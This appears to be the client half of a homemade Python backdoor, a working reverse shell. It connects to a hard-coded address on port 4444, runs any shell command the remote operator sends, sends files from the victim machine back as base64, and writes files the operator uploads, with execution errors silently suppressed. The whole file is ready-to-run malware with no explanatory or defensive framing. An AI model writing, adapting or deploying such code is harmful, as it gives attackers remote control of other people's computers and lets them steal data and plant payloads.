
# ===========================================================================================
# CLIENT FILE
# ===========================================================================================


import os
import socket
import json
import subprocess
import base64
import re


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            print("[!] Send error:", e)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
            except Exception as e:
                print("[!] Receive error:", e)
                return ""

    def change_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changed directory to " + path
        except Exception as e:
            return "[!] Failed to change directory: " + str(e)

    def executing_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True).decode(errors="ignore")
        except Exception as e:
            # return "[!] Command execution failed: " + str(e)
            return ""

    # ✅ DOWNLOAD (client → server)
    def read_file(self, path):
        path = path.strip().strip('"').strip("'")

        if not os.path.exists(path):
            return "[!] File not found: " + path

        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            # return "[!] Error reading file: " + str(e)
            return ""

    # ✅ UPLOAD (server → client)
    def write_file(self, filename, content):
        try:
            with open(filename, "wb") as file:
                file.write(base64.b64decode(content))
            return "[+] Upload successful: " + filename
        except Exception as e:
            # return "[!] Upload failed: " + str(e)
            return ""

    def run(self):
        while True:
            command = self.reliable_receive()

            # =========================
            # ✅ HANDLE UPLOAD FROM SERVER
            # =========================
            if isinstance(command, dict) and command.get("action") == "upload":
                result = self.write_file(command["filename"], command["data"])
                self.reliable_send(result)
                continue

            # =========================
            # NORMAL COMMANDS
            # =========================
            if command == "exit":
                self.connection.close()
                break

            elif command.startswith("cd "):
                path = command[3:]
                command_result = self.change_directory_to(path)

            elif command.startswith("download "):
                path = command.split(" ", 1)[1]
                command_result = self.read_file(path)

            else:
                command_result = self.executing_system_command(command)

            self.reliable_send(command_result)

# def get_primary_ip():
#     output = os.popen("ipconfig").read()
#     match = re.search(r"IPv4 Address[.\s]*:\s*([\d\.]+)", output)
    
#     if match:
#         return match.group(1)
#     return match.group(1)

# ipAddress = get_primary_ip()
# print("Primary IP:", ipAddress)
myBackdoor = Backdoor("192.168.18.6", 4444)
myBackdoor.run()
